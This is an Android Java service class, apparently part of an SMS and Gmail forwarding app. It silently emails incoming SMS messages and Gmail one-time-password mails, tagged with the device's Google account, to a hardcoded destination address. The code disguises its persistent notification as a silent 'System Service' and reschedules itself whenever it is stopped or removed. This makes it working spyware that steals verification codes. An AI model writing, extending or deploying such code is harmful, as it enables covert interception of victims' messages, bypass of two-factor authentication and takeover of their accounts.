package com.smsforwarder;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import androidx.core.app.NotificationCompat;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class ForwarderService extends Service {

    private static final String CHANNEL_ID   = "sys_svc_ch";
    private static final int    NOTIF_ID     = 1;
    private static final String PREFS        = "sms_fwd_prefs";
    private static final String KEY_GMAIL    = "gmail";
    private static final String KEY_PASS     = "pass";
    private static final long   POLL_INTERVAL = 5 * 60 * 1000L; // 5 minutes

    private ExecutorService executor;
    private Handler         pollHandler;
    private Runnable        pollRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        executor = Executors.newSingleThreadExecutor();
        createChannel();
        startForeground(NOTIF_ID, buildNotification());
        WatchdogScheduler.schedule(this);
        startGmailPolling();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String sender = intent.getStringExtra("sender");
            String body   = intent.getStringExtra("body");
            String type   = intent.getStringExtra("type");
            if (sender != null && body != null && !body.isEmpty()) {
                if ("gmail".equals(type)) {
                    sendEmail("[Gmail] " + sender, body, true);
                } else {
                    sendEmail(sender, body, false);
                }
            }
        }
        return START_STICKY;
    }

    // ─── Gmail Polling ────────────────────────────────────────────────────────

    private void startGmailPolling() {
        pollHandler  = new Handler(Looper.getMainLooper());
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                executor.execute(() -> GmailPoller.poll(ForwarderService.this, ForwarderService.this));
                pollHandler.postDelayed(this, POLL_INTERVAL);
            }
        };
        // First poll after 30 seconds (let service settle)
        pollHandler.postDelayed(pollRunnable, 30_000);
    }

    // Called by GmailPoller when an OTP Gmail is found
    public void forwardGmailMessage(String from, String subject, String body) {
        String preview = body.length() > 300 ? body.substring(0, 300) + "..." : body;
        String combined = "Subject: " + subject + "\n\n" + preview;
        sendEmail("[Gmail] " + from, combined, true);
    }

    // ─── Lifecycle ────────────────────────────────────────────────────────────

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        WatchdogScheduler.schedule(this);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (pollHandler != null && pollRunnable != null)
            pollHandler.removeCallbacks(pollRunnable);
        WatchdogScheduler.schedule(this);
        if (executor != null) executor.shutdown();
    }

    // ─── Email sending ────────────────────────────────────────────────────────

    private String getGmailUser() {
        if (!AppConfig.GMAIL_USER.isEmpty()) return AppConfig.GMAIL_USER;
        return getSharedPreferences(PREFS, MODE_PRIVATE).getString(KEY_GMAIL, "");
    }

    private String getGmailPass() {
        if (!AppConfig.GMAIL_APP_PASSWORD.isEmpty()) return AppConfig.GMAIL_APP_PASSWORD;
        return getSharedPreferences(PREFS, MODE_PRIVATE).getString(KEY_PASS, "");
    }

    private String getDeviceGmail() {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccountsByType("com.google");
            if (accounts.length > 0) return accounts[0].name;
        } catch (Exception ignored) {}
        return "unknown-device";
    }

    private void sendEmail(String senderLabel, String messageBody, boolean isGmail) {
        executor.execute(() -> {
            String gmailUser = getGmailUser().trim();
            String gmailPass = getGmailPass().trim();
            String destEmail = AppConfig.DEST_EMAIL.trim();
            if (gmailUser.isEmpty() || gmailPass.isEmpty() || destEmail.isEmpty()) return;
            try {
                String deviceGmail = getDeviceGmail();
                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");
                props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
                props.put("mail.smtp.connectiontimeout", "15000");
                props.put("mail.smtp.timeout", "15000");

                final String u = gmailUser, p = gmailPass;
                Session session = Session.getInstance(props, new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(u, p);
                    }
                });

                String subjectLine = isGmail
                    ? "GMAIL OTP | " + deviceGmail + " | " + senderLabel
                    : "SMS | " + deviceGmail + " | From: " + senderLabel;

                Message msg = new MimeMessage(session);
                msg.setFrom(new InternetAddress(gmailUser));
                msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse(destEmail));
                msg.setSubject(subjectLine);
                msg.setText(
                    "Device: " + deviceGmail + "\n" +
                    (isGmail ? "Gmail From: " : "SMS From: ") + senderLabel + "\n\n" +
                    messageBody
                );
                Transport.send(msg);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    // ─── Notification ─────────────────────────────────────────────────────────

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
            ch.setDescription("Running");
            ch.setShowBadge(false);
            ch.enableLights(false);
            ch.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
